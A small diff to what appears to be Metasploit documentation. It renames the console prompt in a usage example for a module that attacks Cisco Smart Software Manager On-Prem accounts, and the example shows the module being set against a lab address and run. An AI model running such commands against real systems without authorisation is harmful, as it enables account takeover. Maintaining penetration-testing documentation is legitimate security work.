@@ -40,9 +40,9 @@ Running the module against Smart Software Manager (SSM) On-Prem v8-202206 should
 similar to the following:
 
 ```
-msf6 > use auxiliary/admin/http/cisco_ssm_onprem_account 
-msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > set RHOSTS 192.168.137.200
-msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > exploit 
+msf > use auxiliary/admin/http/cisco_ssm_onprem_account 
+msf auxiliary(admin/http/cisco_ssm_onprem_account) > set RHOSTS 192.168.137.200
+msf auxiliary(admin/http/cisco_ssm_onprem_account) > exploit 
 [*] Running module against 192.168.137.200
 
 [+] Server reachable.
